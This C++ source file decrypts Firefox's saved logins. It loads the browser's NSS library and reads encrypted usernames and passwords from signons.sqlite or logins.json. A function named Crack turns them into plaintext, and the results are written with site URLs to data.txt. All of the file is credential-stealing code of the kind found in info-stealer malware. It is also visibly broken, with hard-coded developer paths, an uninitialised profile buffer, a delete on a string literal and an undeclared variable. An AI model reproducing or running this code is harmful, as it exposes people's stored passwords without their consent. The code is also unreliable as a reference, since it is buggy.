#pragma once 

#define NOMINMAX
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0
#define SQLITE_OK 0
#define SQLITE_ROW 100
#define SQLITE_API

char g_ver[20];


typedef enum SECItemType {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID,
	siUnsignedInteger,
	siUTCTime,
	siGeneralizedTime
};

struct SECItem {
	SECItemType type;
	unsigned char *data;
	size_t len;
};

typedef enum SECStatus {
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
};


typedef struct PK11SlotInfoStr PK11SlotInfo;
typedef SECStatus(*NSS_Init) (const char *);
typedef SECStatus(*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void(*PK11_FreeSlot) (PK11SlotInfo *);
typedef SECStatus(*PK11_Authenticate) (PK11SlotInfo *, PRBool, void *);
typedef SECStatus(*PK11SDR_Decrypt) (SECItem *, SECItem *, void *);
typedef int (*PK11_NeedLogin)(PK11SlotInfo *);
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int(SQLITE_API *fpSqliteOpen)(const char *, sqlite3 **);
typedef int(SQLITE_API *fpSqlitePrepare_v2)(sqlite3 *, const char *, int, sqlite3_stmt **, const char **);
typedef int(SQLITE_API *fpSqliteStep)(sqlite3_stmt *);
typedef const unsigned char *(SQLITE_API *fpSqliteColumnText)(sqlite3_stmt*, int);

PK11_GetInternalKeySlot PK11GetInternalKeySlot;
PK11_FreeSlot           PK11FreeSlot;
PK11_Authenticate       PK11Authenticate;
PK11_NeedLogin			PK11NeedLogin; 
PK11SDR_Decrypt         PK11SDRDecrypt;
NSS_Init                fpNSS_INIT;
NSS_Shutdown            fpNSS_Shutdown;

fpSqliteOpen isqlite3_open;
fpSqlitePrepare_v2 isqlite3_prepare_v2;
fpSqliteStep isqlite3_step;
fpSqliteColumnText isqlite3_column_text;


char *installPath(){
	DWORD cbSize;
	char value[MAX_PATH];
	char *path = "SOFTWARE\\Mozilla\\Mozilla Firefox";

	cbSize = MAX_PATH;
	if (!SHGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Mozilla\\Mozilla Firefox", "CurrentVersion", 0, value, &cbSize)){
		path = dupcat(path, "\\", value, "\\Main", 0);
		strcpy(g_ver, value);
		//printf("[+] Firefox version %s\n", g_ver);
		cbSize = MAX_PATH;
		if (!SHGetValue(HKEY_LOCAL_MACHINE, path, "Install Directory", 0, value, &cbSize)){
			int size = strlen(value) + 1;
			char *ret = (char *)calloc(size, 1);
			memcpy(ret, value, size);
			delete[]path;
			return ret;
		}
	}

	return 0;
}

BOOL loadFunctions(char *installPath){
	if (installPath){
		//Lets use the standard library functions,instead of Get/Set EnvironmentVariable
		char *path = getenv("PATH");
		if (path){
			char *newPath = dupcat(path, ";", installPath, 0);
			//_putenv(dupcat("PATH=", newPath, 0));
			putenv(dupcat("PATH=", newPath, 0));
			delete[]newPath;
		}
		HMODULE hNSS = LoadLibrary("d:\\share\\firefox64\\nss3.dll");//(dupcat(installPath, "\\nss3.dll", 0)));
		int k = GetLastError();
		if (hNSS){
			fpNSS_INIT = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
			fpNSS_Shutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
			PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
			PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
			PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
			PK11NeedLogin = (PK11_NeedLogin)GetProcAddress(hNSS, "PK11_NeedLogin");
			PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
			isqlite3_open = (fpSqliteOpen)GetProcAddress(hNSS, "sqlite3_open");
			isqlite3_prepare_v2 = (fpSqlitePrepare_v2)GetProcAddress(hNSS, "sqlite3_prepare_v2");
			isqlite3_step = (fpSqliteStep)GetProcAddress(hNSS, "sqlite3_step");
			isqlite3_column_text = (fpSqliteColumnText)GetProcAddress(hNSS, "sqlite3_column_text");
		}
		return !(!fpNSS_INIT || !fpNSS_Shutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot);
	}
	return FALSE;
}

char *Crack(const char *s){
	BYTE byteData[8096];
	DWORD dwLength = 8096;
	PK11SlotInfo *slot = 0;
	SECStatus status;
	SECItem in, out;
	char *result = "";

	typedef struct {
		enum {
			PW_NONE = 0,
			PW_FROMFILE = 1,
			PW_PLAINTEXT = 2,
			PW_EXTERNAL = 3
		} source;
		char *data;
	} secuPWData;

	char pw_str[5] = "1234";
	pw_str[4] = '\0';
	secuPWData pw = { secuPWData::PW_PLAINTEXT, "1234" };
	//pw.source = secuPWData::PW_PLAINTEXT;
	//pw.data = pw_str;

	ZeroMemory(byteData, sizeof (byteData));

	if (CryptStringToBinary(s, strlen(s), CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0)){
		slot = (*PK11GetInternalKeySlot) ();
		//if (PK11NeedLogin(slot)) {
		if (slot != NULL){
			status = PK11Authenticate(slot, PR_TRUE, NULL);
			//status = PK11Authenticate(slot, PR_TRUE, &pw);
			if (status == SECSuccess){
				in.data = byteData;
				in.len = dwLength;
				out.data = 0;
				out.len = 0;
				status = (*PK11SDRDecrypt) (&in, &out, NULL);
				if (status == SECSuccess){
					memcpy(byteData, out.data, out.len);
					byteData[out.len] = 0;
					result = ((char*)byteData);
				}
				else
					result = "Error on decryption!";
			}
			else
				result = "Error on authenticate!";
			(*PK11FreeSlot) (slot);
		}
		else{
			result = "Get Internal Slot error!";

		}
	}
	return result;
}

void showDecryptedPasswords(){
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
	_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	//snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\profiles.ini", appData);
	GetPrivateProfileSectionNames(sections, 4096, path);
	char *p = sections;

	while (1){
		if (strncmp(p, "Profile", 7) == 0) {
		//if (_strnicmp(p, "Profile", 7) == 0) {
			//GetPrivateProfileString(p, "Path", NULL, profile, MAX_PATH, path);
			_snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());
			//snprintf(path, sizeof(path), "%s\\Mozilla\\Firefox\\Profiles\\%s", appData, std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());

			if (!(*fpNSS_INIT) ("E:\\sfdata\\FFProfile\\sf64")){
				int ver = 57;// atoi(g_ver);
				if (ver < 32){
					//printf("[+] Using sqlite keep userinfo...\n");

					char *database = dupcat(path, "\\signons.sqlite", 0);
					//
					int entries = 0;
					sqlite3 *db;
					if (isqlite3_open(database, &db) == SQLITE_OK) {
						sqlite3_stmt *stmt;
						char *query = "SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins";
						if (isqlite3_prepare_v2(db, query, -1, &stmt, 0) == SQLITE_OK) {
							out = fopen("data.txt", "a+");
							if (out){
								fprintf(out, "%s\n\n", "From Mozilla Firefox:\n");
								while (isqlite3_step(stmt) == SQLITE_ROW) {
									fprintf(out, "%s\n", dupncat("-", 50));
									char *user, *password, *site;
									user = (char*)isqlite3_column_text(stmt, 0);
									password = (char*)isqlite3_column_text(stmt, 1);
									site = (char*)isqlite3_column_text(stmt, 2);
									entries++;

									fprintf(out, "Entry: %d\n", entries);
									fprintf(out, "URL: %s\n", site);
									fprintf(out, "Username: %s\n", Crack(user));
									fprintf(out, "Password: %s\n", Crack(password));
									fprintf(out, "%s\n", dupncat("-", 50));
								}
								fclose(out);
							}
							delete[]database;
						}
						else
							printf("Can't prepare database!\n");
					}
					else
						printf("Can't open database!\n");
					if (entries == 0)
						printf("No entries found in %s\n", database);
				}
				else{
					// logins.json
					//printf("[+] Using json keep userinfo.\n");
					char *jsonfile = "E:\\sfdata\\FFProfile\\sf64\\logins.json";// dupcat(path, "\\logins.json", 0);
					FILE *loginJson;
					DWORD JsonFileSize = 0;
					char *p, *q, *qu;

					int entries = 0;

					loginJson = fopen(jsonfile, "r");
					if (loginJson)
					{
						fseek(loginJson, 0, SEEK_END);
						JsonFileSize = ftell(loginJson);
						fseek(loginJson, 0, SEEK_SET);

						p = new char[JsonFileSize + 1];
						fread(p, 1, JsonFileSize, loginJson);

						out = fopen("data.txt", "a+");
						if (out){
							fprintf(out, "%s\n\n\n", "From Mozilla Firefox:\n");
							while ((q = strstr(p, "formSubmitURL")) != NULL) {
								fprintf(out, "%s\n", dupncat("-", 50));
								fprintf(out, "Entry: %d\n", entries++);

								q += strlen("formSubmitURL") + 3;
								qu = strstr(q, "usernameField") - 3;
								*qu = '\0';

								fprintf(out, "URL: %s\n", q);
								q = strstr(qu + 1, "encryptedUsername") + strlen("encryptedUsername") + 3;
								qu = strstr(q, "encryptedPassword") - 3;
								*qu = '\0';
								fprintf(out, "Username: %s\n", Crack(q));
								q = strstr(qu + 1, "encryptedPassword") + strlen("encryptedPassword") + 3;
								qu = strstr(q, "guid") - 3;
								*qu = '\0';
								fprintf(out, "Password: %s\n", Crack(q));
								p = qu + 1;
								fprintf(out ,"%s\n", dupncat("-", 50));
							}
							fclose(out);
						}
						delete[]jsonfile;
						fclose(loginJson);
					}
					if (entries == 0)
						printf("No entries found!\n");
				}
				(*fpNSS_Shutdown) ();
			}
			else
				printf("NSS_Init() error!\n");
		}
		p += lstrlen(p) + 1;
		if (p[0] == 0) break;
	}
}
